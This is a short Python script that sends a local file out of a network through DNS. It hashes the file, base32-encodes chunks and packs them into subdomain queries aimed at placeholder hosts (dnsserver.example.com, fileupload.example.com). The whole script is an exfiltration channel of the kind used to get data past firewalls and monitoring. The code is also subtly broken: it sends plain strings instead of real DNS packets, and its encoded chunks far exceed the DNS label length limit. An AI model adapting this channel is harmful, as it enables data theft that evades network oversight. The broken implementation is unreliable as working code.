import socket
import base64
import hashlib
import os

# DNS server domain name
DNS_SERVER = "dnsserver.example.com"
DNS_PORT = 53

# Assign the domain directly here
domain = "fileupload.example.com"

# File to send
file_path = "path/to/your/file.pdf"  # Replace with the actual file path
file_name = os.path.basename(file_path)  # Extracts the file name with extension

def chunk_file(file_data, chunk_size=255):
    """Splits the file data into chunks of a given size."""
    return [file_data[i:i + chunk_size] for i in range(0, len(file_data), chunk_size)]

def send_dns_query(domain):
    """Sends a DNS query to the server."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(domain.encode(), (DNS_SERVER, DNS_PORT))

def send_file_info(file_name, file_md5):
    """Sends the file name and its MD5 hash to the server."""
    domain = f"{file_name}.{file_md5}.fileinfo.fileupload.example.com"
    send_dns_query(domain)

def send_chunk(chunk, sequence_number):
    """Sends a chunk of the file as a DNS query."""
    encoded_chunk = base64.b32encode(chunk).decode('utf-8')
    domain = f"{encoded_chunk}.chunk{sequence_number}.fileupload.example.com"
    send_dns_query(domain)

def send_end_of_transmission():
    """Sends a special DNS query to signal the end of the file transmission."""
    domain = "end.chunk999.fileupload.example.com"
    send_dns_query(domain)

# Calculate the MD5 hash of the file
def calculate_md5(file_path):
    md5 = hashlib.md5()
    with open(file_path, 'rb') as file:
        while chunk := file.read(4096):
            md5.update(chunk)
    return md5.hexdigest()

# Compute the MD5 hash of the file
file_md5 = calculate_md5(file_path)
print(f"MD5 hash of the original file: {file_md5}")

with open(file_path, "rb") as file:
    file_data = file.read()

# Send the file name and MD5 hash to the server
send_file_info(file_name, file_md5)

# Chunk the file into smaller pieces
chunks = chunk_file(file_data)

# Send each chunk as a DNS query
for i, chunk in enumerate(chunks):
    send_chunk(chunk, i)

# Send the final chunk to signal the end of the file transmission
send_end_of_transmission()

print("File chunks sent successfully.")
